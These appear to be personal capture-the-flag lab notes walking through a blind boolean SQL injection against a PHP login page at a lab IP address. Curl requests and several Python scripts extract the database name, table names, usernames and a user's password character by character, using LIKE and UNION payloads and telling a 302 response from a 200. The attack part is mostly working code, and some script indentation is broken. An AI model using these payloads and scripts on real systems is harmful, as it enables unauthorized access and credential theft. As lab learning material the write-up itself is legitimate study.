
On trying the sql injection query from  https://github.com/payloadbox/sql-injection-payload-list


```
' OR 1 -- -
```

![[Pasted image 20240212001144.png]]

On fuzzing the payload works with,
![[Pasted image 20240212001618.png]]

```
admin'  AND 1=1-- 
```


we have the extra space... .

when requested from repeater, we are getting 302 for the same payload
![[Pasted image 20240212002655.png]]

When trying with the other username we are getting 200 which actually dosnt lead to any where.

![[Pasted image 20240212003351.png]]

So we can conclude that 302 is a positive resp but 200 is not. 

In burp we need to change the cookie value for the different req, which gives a prev sec we know the admin creds with the cookie reuse possibility. 

Using curl for the recursive req

Original taken from Burp
curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.19.115' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 40' -H $'Origin: http://10.10.19.115' -H $'Connection: close' -H $'Referer: http://10.10.19.115/index.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=2c53oqrpln03phqr0teenbvjmBV' \
    --data-binary $'username=test1%27+AND+1%3D1--+&password=' \
    $'http://10.10.19.115/index.php'


updated curl req

`curl 'http://10.10.19.115/index.php/' -X POST -d "username=test1%27+AND+1%3D1--+&password=" -s -w "%{http_code}" -o /dev/null`

![[Pasted image 20240212004041.png]]

And the query works is, mind the white space
`admin' ORDER BY 1 -- `

On manually brute forcing, we get there are 5 columns,
```bash
curl 'http://10.10.19.115/index.php/' -X POST -d "username=admin%27+ORDER+BY+4--+&password=" -s -w "%{http_code}" -o /dev/null
```


![[Pasted image 20240212005100.png]]


After multiple attempts to find the db name using the like and union query formats, we landed up with,
```bash
curl 'http://10.10.19.115/index.php/' -X POST -d "username=%27+UNION+SELECT+1,2,3,4+WHERE+database()+LIKE+'m%'--+&password=" -s -w "%{http_code}" -o /dev/null

```
![[Pasted image 20240212010424.png]]



Now we can seemingly write a script for this to automate?
```python
import requests

res = ""

chars_list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-/:~$^ "

ip = "10.10.19.115"

while True:
	for i in chars_list:
		body= {"username":f"' UNION SELECT 1,2,3,4 WHERE database() LIKE '{res+i}%'-- ","password":""}
		response = requests.post(f"http://{ip}/index.php", data=body,allow_redirects=False)
		status_code=response.status_code
		if status_code == 302:
			res = res+i
			print(f"in progress ==> {res}")
			break
		elif i == " " :
			print(f" final ==> {res}")
			exit()
```

![[Pasted image 20240212012934.png]]


updating the payload query to get the users... 
```
' UNION SELECT 1,2,3,4 WHERE database() LIKE '{res+i}%'--
```

```python
import requests

res = ""

chars_list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-/:~$^ "

ip = "10.10.19.115"

while True:

	for i in chars_list:
	
		body= {"username":f"' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = database() AND table_name LIKE '{res+i}%' -- ","password":""}
		
		response = requests.post(f"http://{ip}/index.php", data=body,allow_redirects=False)
		
		status_code=response.status_code
		
		if status_code == 302:
		
			res = res+i
			
			print(f"in progress ==> {res}")
			
			break
			
		elif i == " " :
		
			print(f" final ==> {res}")
			
			exit()
	```
![[Pasted image 20240212013401.png]]

updated query to find the usernames, 
```
' UNION SELECT 1,2,3,4 FROM siteusers WHERE username LIKE '{res+i}%' --
```

```python
import requests

res = ""

chars_list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-/:~$^ "

ip = "10.10.19.115"

users = set()

while True:

	for idx, i in enumerate(chars_list):
	
		if "admin" in users and idx == 0 and i == "a":
		
		continue
		
		body= {"username":f"' UNION SELECT 1,2,3,4 FROM siteusers WHERE username LIKE '{res+i}%' -- ","password":""}
		
		response = requests.post(f"http://{ip}/index.php", data=body,allow_redirects=False)
		
		status_code=response.status_code
		
		if status_code == 302:
		
			res = res+i
			
			print(f"in progress ==> {res}")
			
			break
			
		elif i == " ":
		
			print(f" final ==> {res}")
			
			if res == "admin":
			
			users.add(res)
			
			  
			
			# exit()
			
			res = ""
```

![[Pasted image 20240212014630.png]]

so after a non-optimal user bruteforcing we got the user name kitty

now brute forcing for password. 
```
' UNION SELECT 1,2,3,4 FROM siteusers WHERE username='kitty' AND password LIKE '{res+i}%' -- 
```

```python
import requests

res = ""

chars_list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-/:~$^ "

ip = "10.10.19.115"

while True:

	for i in chars_list:
	
		body= {"username":f"' UNION SELECT 1,2,3,4 FROM siteusers WHERE username='kitty' AND password LIKE '{res+i}%' -- ","password":""}
		
		response = requests.post(f"http://{ip}/index.php", data=body,allow_redirects=False)
		
		status_code=response.status_code
		
		if status_code == 302:
		
			res = res+i
			
			print(f"in progress ==> {res}")
			
			break
			
		elif i == " " :
			
			print(f" final ==> {res}")
			
			exit()
```

![[Pasted image 20240212015231.png]]

But on trying to ssh, it fails. 
![[Pasted image 20240212015652.png]]

It could be due to the case insensitive of sql db. 
Lets use binary in the qeury to return us case sensitive results.

```
' UNION SELECT 1,2,3,4 FROM siteusers WHERE username='kitty' AND password LIKE BINARY '{res+i}%' -- 
```



![[Pasted image 20240212021325.png]]

